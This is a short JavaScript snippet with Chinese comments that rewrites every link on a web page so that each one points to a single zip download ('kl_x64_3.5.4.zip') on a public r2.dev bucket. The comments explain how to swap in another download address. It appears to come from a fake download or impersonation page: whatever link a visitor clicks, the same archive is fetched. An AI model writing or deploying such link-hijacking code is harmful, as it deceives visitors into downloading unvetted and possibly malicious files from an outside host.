var xz ="download.html?file=https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/kl_x64_3.5.4.zip";

//可以把   https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/kl_x64_3.5.4.zip  这个改成下载地址；https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/kl_x64_3.5.4.zip
//可以把   https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/kl_x64_3.5.4.zip  这个改成文件下载：https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/kl_x64_3.5.4.zip
var links = document.getElementsByTagName("a");
for (var i = 0; i < links.length; i++) {
    if (links[i].hasAttribute("href")) {
        links[i].href = xz;
    }
} 
